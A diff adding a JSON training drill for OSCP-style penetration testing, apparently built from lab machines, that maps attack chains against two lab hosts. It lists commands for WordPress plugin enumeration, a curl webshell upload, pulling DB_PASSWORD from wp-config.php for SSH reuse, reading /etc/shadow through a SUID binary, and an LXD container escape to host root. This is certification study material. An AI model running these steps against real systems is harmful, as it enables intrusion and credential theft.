@@ -1,0 +1,197 @@
+{
+  "id": "wordpress-plugin-to-root",
+  "title": "WordPress Plugin to Root",
+  "category": "service-drill",
+  "source": ["Relia", "HTB Brainfuck"],
+  "designed_by": "ai-composite",
+  "description": "WordPress drill: wpscan → WP Support Plus auth bypass → webshell → config → password reuse → SSH → linpeas → SUID. WP-TARGET. BRAINFUCK: WP plugin SMTP → admin → encrypted forum → RSA key → lxd escape → root.",
+
+  "introduction": "WordPress plugins and wp-config.php are prime credential sources; DB passwords often reuse for SSH—essential OSCP pattern.",
+  "mental_model": "Plugin vulns give webshell; wp-config gives creds; always check password reuse across SSH, FTP, and DB.",
+  "key_principles": [
+    "wpscan plugins and users before exploits",
+    "wp-config.php DB_PASSWORD often = SSH password",
+    "Encrypted files may hide SSH keys—decrypt first",
+    "LXD with security.privileged mounts host root",
+    "SUID binaries may accept file path injection"
+  ],
+
+  "indicators": {
+    "difficulty": 5,
+    "cognitive_load": 4,
+    "enumeration_depth": 4,
+    "rabbit_hole_risk": 4,
+    "time_pressure": 4
+  },
+
+  "mitre": {
+    "tactics": ["TA0001", "TA0003", "TA0004", "TA0006"],
+    "techniques": [
+      {"id": "T1190", "name": "Exploit Public-Facing Application"},
+      {"id": "T1552.001", "name": "Credentials In Files"},
+      {"id": "T1078.003", "name": "Cloud Accounts"},
+      {"id": "T1068", "name": "Exploitation for Privilege Escalation"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon", "T2-Web-Access", "T3-NonWeb-Access", "T4a-Linux-PrivEsc"],
+
+  "environment": {
+    "machine_count": 2,
+    "network_count": 1,
+    "os_distribution": {"windows": 0, "linux": 2},
+    "has_ad": false,
+    "has_pivoting": false,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "wordpress", "wpscan", "wp-support-plus", "auth-bypass",
+    "webshell", "wp-config", "ssh", "suid", "linpeas",
+    "lxd", "container-escape"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": false,
+    "pen200_modules": [6, 12, 16, 17],
+    "pattern_frequency": "high",
+    "recommended_order": 6
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "10.10.10.0/24", "label": "External"}
+  ],
+
+  "machines": [
+    {
+      "id": "wp-target",
+      "label": "WP-TARGET",
+      "ip": "10.10.10.245",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {
+          "port": 80,
+          "name": "WordPress",
+          "version": "5.x",
+          "vulnerabilities": [
+            {"type": "auth-bypass", "summary": "WP Support Plus auth bypass → upload", "leads_to": "webshell"}
+          ],
+          "commands": [
+            "wpscan --url http://10.10.10.245 -e ap,at,cb,dbe,u",
+            "wpscan --url http://10.10.10.245 -e vp --plugins-detection aggressive",
+            "searchsploit wp support plus",
+            "curl -X POST 'http://10.10.10.245/wp-content/plugins/wp-support-plus-responsive-ticket-system/...' -d 'file=@shell.php'"
+          ]
+        },
+        {
+          "port": 22,
+          "name": "SSH",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "SSH with creds from wp-config.php", "leads_to": "local-user"}
+          ],
+          "commands": [
+            {"cmd": "cat wp-config.php | grep DB_PASSWORD", "rationale": "Why: DB password often reuses for SSH"},
+            "ssh oscp@10.10.10.245",
+            "linpeas.sh"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "oscp",
+          "to": "root",
+          "technique": "SUID binary",
+          "commands": [
+            "find / -perm -4000 -type f 2>/dev/null",
+            "strings /usr/local/bin/custom-backup",
+            {"cmd": "/usr/local/bin/custom-backup -f /etc/shadow", "rationale": "Why: SUID binary may accept path to read/write files"}
+          ]
+        }
+      ],
+      "credentials": [
+        {"user": "oscp", "type": "password", "source": "wp-config.php DB_PASSWORD reuse", "unlocks": ["ssh"]}
+      ],
+      "alternatives": []
+    },
+    {
+      "id": "brainfuck",
+      "label": "BRAINFUCK",
+      "ip": "10.10.10.17",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {
+          "port": 80,
+          "name": "WordPress",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "rce", "summary": "WP plugin SMTP config → RCE", "leads_to": "www-data"}
+          ],
+          "commands": [
+            "wpscan --url http://10.10.10.17 -e vp",
+            "searchsploit wordpress smtp",
+            "# Exploit SMTP config for RCE"
+          ]
+        },
+        {
+          "port": 443,
+          "name": "HTTPS",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "Encrypted forum with admin creds", "leads_to": "rsa-key"}
+          ],
+          "commands": [
+            {"cmd": "gpg --decrypt forum.enc", "rationale": "Why: Encrypted files often hide SSH keys or creds"},
+            "cat forum.enc | gpg -d"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "oscp",
+          "to": "root",
+          "technique": "LXD container escape",
+          "commands": [
+            "id",
+            "groups",
+            {"cmd": "lxc init ubuntu test -c security.privileged=true", "rationale": "Why: Privileged container runs as root on host"},
+            {"cmd": "lxc config device add test root disk source=/ path=/mnt/root recursive=true", "rationale": "Why: Mount host root into container for escape"},
+            "lxc start test",
+            "lxc exec test /bin/bash",
+            "chroot /mnt/root"
+          ]
+        }
+      ],
+      "credentials": [
+        {"user": "oscp", "type": "ssh-key", "source": "Decrypted forum → RSA key", "unlocks": ["ssh"]}
+      ],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [],
+
+  "attack_paths": [
+    {
+      "id": "path-wp-target",
+      "name": "WP-TARGET: Plugin → Config → SUID",
+      "color": "#6bb8cc",
+      "steps": ["wp-target"],
+      "description": "wpscan → WP Support Plus auth bypass → webshell → config → password reuse → SSH → linpeas → SUID"
+    },
+    {
+      "id": "path-brainfuck",
+      "name": "BRAINFUCK: SMTP → Forum → LXD",
+      "color": "#e8a87c",
+      "steps": ["brainfuck"],
+      "description": "WP plugin SMTP → admin → encrypted forum → RSA key → lxd escape → root"
+    }
+  ]
+}
